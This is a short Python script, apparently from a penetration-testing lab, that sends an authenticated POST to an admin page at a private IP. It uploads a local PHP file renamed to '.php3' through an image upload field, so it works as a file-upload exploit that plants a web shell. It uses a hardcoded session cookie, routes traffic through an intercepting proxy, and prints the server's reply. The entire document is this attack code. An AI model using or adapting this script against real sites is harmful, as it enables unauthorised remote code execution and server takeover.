import requests
from sys import argv
from colorama import Fore, Back, Style

#requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
#Configuration

target="172.16.113.157/admin/index.php"
url = "http://" + target
payload = {'title':"console5", 'category':'1', 'Add':'Add'}
files={'image':('console26.php3',open('/home/nyanyi/console.php3','rb'),'application/x-php')}
cookies=dict(PHPSESSID='0icvgot68eies8atfo8lq0des1')
parameters='y'
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#functions


def requests_post_params(url, payload):
    r= requests.post(url, files=files, data=payload, cookies=cookies, proxies=proxies,  verify=False)
    response(r)

def requests_post_simple(url):
    r = requests.post(url, verify=False)
    response(r)

def response(post_response): 
    r = post_response
    print(format_text('Url is: ', r.url))
    print(format_text('Status_code is: ', r.status_code))
    print(format_text('Cookies is: ',r.cookies))
    print(format_text('Text is: ',r.text))

def format_text(title,item):
    cr='\r\n'
    section_break = cr + "*" * 25 +cr
    item = str(item)
    text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break
    return text

def main():
	if parameters == 'n':
    		requests_post_simple(url)

	else:
		requests_post_params(url, payload)

#start

if __name__=="__main__":
    main()

    
